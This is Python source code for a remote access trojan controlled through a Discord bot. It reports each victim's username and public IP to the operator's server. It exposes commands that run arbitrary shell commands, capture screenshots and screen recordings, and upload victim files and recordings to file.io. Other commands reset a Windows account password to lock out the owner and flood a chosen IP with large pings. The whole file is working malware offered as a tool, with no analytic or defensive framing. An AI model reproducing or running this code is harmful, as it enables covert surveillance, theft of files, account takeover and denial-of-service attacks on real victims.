import discord, os, pyautogui, requests, cv2, numpy, subprocess, threading
from config import *

token = token
guildid = guildid

client = discord.Bot(intents=discord.Intents.all())

def main():

    @client.event
    async def on_ready():
        global channel
        channel = await client.guilds[0].create_text_channel(f"session-{os.getenv('username')}")
        embed = discord.Embed(title="New Session Created", color=0x660cf)
        embed.add_field(name="Username", value=f"```{os.getenv('username')}```")
        embed.add_field(name="IP Address", value=f"```{requests.get('https://api.ipify.org').text}```")
        await channel.send("@everyone", embed=embed)

        global channelid
        channelid = channel.id

    @client.slash_command(name="killall", guild_ids=guildid)
    async def killall(ctx):
        if ctx.channel.id == channel.id:
            embed = discord.Embed(title="Command Executed", description="```Killing Sessions..```", color=0x660cf)
            await ctx.respond(embed=embed)
            for channel in client.guilds[0].channels:
                try: await channel.delete()
                except Exception: pass 
            os._exit(0)

    @client.slash_command(name="kill", guild_ids=guildid)
    async def kill(ctx):
        if ctx.channel.id == channel.id:
            embed = discord.Embed(title="Command Executed", description="```Killing Session..```", color=0x660cf)
            await ctx.respond(embed=embed)
            await channel.delete()
            os._exit(0)

    @client.slash_command(name="cd", guild_ids=guildid)
    async def cd(ctx, directory):
        if ctx.channel.id == channel.id:
            try:
                os.chdir(directory)
                embed = discord.Embed(title="Command Executed", description=f"```New Directory:\n{directory}```", color=0x660cf)
                await ctx.respond(embed=embed)
            except Exception as error:
                embed = discord.Embed(title="Something went wrong", description=f"```{error}```", color=0x660cf)
                await ctx.respond(embed=embed)

    @client.slash_command(name="list", guild_ids=guildid)
    async def list(ctx):
        if ctx.channel.id == channel.id:
            os.system(f'dir /d > "{os.getenv("TEMP")}\\output.txt"')
            list = open(f"{os.getenv('TEMP')}\\output.txt", "r").read()
            embed = discord.Embed(title="Command Executed", description=f"```{list}```", color=0x660cf)
            await ctx.respond(embed=embed)
            os.remove(f"{os.getenv('TEMP')}\\output.txt")

    @client.slash_command(name="screenshot", guild_ids=guildid)
    async def screenshot(ctx):
        if ctx.channel.id == channel.id:
            embed = discord.Embed(title="Screenshot Captured", color=0x660cf)
            embed.set_image(url="attachment://screenshot.png")
            pyautogui.screenshot(f"{os.getenv('TEMP')}\\screenshot.png")
            screenshot = discord.File(f"{os.getenv('TEMP')}\\screenshot.png")
            await ctx.respond(file=screenshot, embed=embed)
            os.remove(f"{os.getenv('TEMP')}\\screenshot.png")

    @client.slash_command(name="download", guild_ids=guildid)
    async def download(ctx, file):
        if ctx.channel.id == channel.id:
            embed = discord.Embed(title="Downloading File..", color=0x660cf)
            await ctx.respond(embed=embed)
            link = requests.post("https://file.io/", files={"file": open(file, "rb")}).json()["link"]
            embed = discord.Embed(title="Downloaded File", description=f"{link}", color=0x660cf)
            await ctx.respond(embed=embed)

    @client.slash_command(name="shell", guild_ids=guildid)
    async def shell(ctx, command):
        if ctx.channel.id == channel.id:
            try:
                os.system(f'{command} > "{os.getenv("TEMP")}\\shell.txt"')
                list = open(f"{os.getenv('TEMP')}\\shell.txt", "r").read()
                embed = discord.Embed(title="Command Executed", description=f"```{list}```", color=0x660cf)
                await ctx.respond(embed=embed)
                os.remove(f"{os.getenv('TEMP')}\\shell.txt")
            except Exception as error:
                embed = discord.Embed(title="Something went wrong", description=f"```{error}```", color=0x660cf)
                await ctx.respond(embed=embed)

    @client.slash_command(name="ddos", guild_ids=guildid)
    async def ddos(ctx, ip, threads, requests):
        if ctx.channel.id == channel.id:
            try:
                embed = discord.Embed(title="Attack Started", description=f"```Requests: {requests}\nThreads: {threads}```", color=0x660cf)
                await ctx.respond(embed=embed)
                for i in range(int(threads)): thread = threading.Thread(); thread.start()
                for i in range(int(requests)):
                    subprocess.check_output(f"ping {ip} -l 65500 -w 1 -n 1")
                for i in range(int(threads)): thread.join()
                os.system(f"ping {ip} > {os.getenv('TEMP')}\\log.txt")
                log = open(f"{os.getenv('TEMP')}\\log.txt", "r").read()
                embed = discord.Embed(title="Attack Stopped", description=f"```{log}```", color=0x660cf)
                await ctx.respond(embed=embed)
                os.remove(f"{os.getenv('TEMP')}\\log.txt")
            except Exception as error:
                embed = discord.Embed(title="Something went wrong", description=f"```{error}```", color=0x660cf)
                await ctx.respond(embed=embed)

    @client.slash_command(name="record", guild_ids=guildid)
    async def record(ctx, duration):
        if ctx.channel.id == channel.id:
            embed = discord.Embed(title="Recording Started", description=f"```Recording for {duration} seconds```", color=0x660cf)
            await ctx.respond(embed=embed)
            out = cv2.VideoWriter(f"{os.getenv('TEMP')}\\output.mp4", cv2.VideoWriter_fourcc(*"H264"), 30, (tuple(pyautogui.size())))
            for i in range(int(duration) * 30):
                img = pyautogui.screenshot()
                frame = numpy.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
            out.release()
            link = requests.post('https://file.io/', files={"file": open(f"{os.getenv('TEMP')}\\output.mp4", "rb")}).json()["link"]
            embed = discord.Embed(title="Recording Stopped", description=f"{link}", color=0x660cf)
            await ctx.send(embed=embed)
            os.remove(f"{os.getenv('TEMP')}\\output.mp4")

    @client.slash_command(name="lock", guild_ids=guildid)
    async def lock(ctx, username, password):
        if ctx.channel.id == channel.id:
            try:
                subprocess.check_output(f'net user "{username}" "{password}"')
                embed = discord.Embed(title="Password Changed", description=f"```Username: {username}\nPassword: {password}```", color=0x660cf)
                await ctx.respond(embed=embed)
            except Exception as error:
                embed = discord.Embed(title="Somenthing went wrong", description=f"```{error}```", color=0x660cf)
                await ctx.respond(embed=embed)

    @client.slash_command(name="whois", guild_ids=guildid)
    async def whois(ctx):
        if ctx.channel.id == channel.id:
            embed = discord.Embed(title="Command Executed", description=f"```{os.getenv('USERNAME')}```", color=0x660cf)
            await ctx.respond(embed=embed)

    client.run(token)

if __name__ == "__main__":
    main()
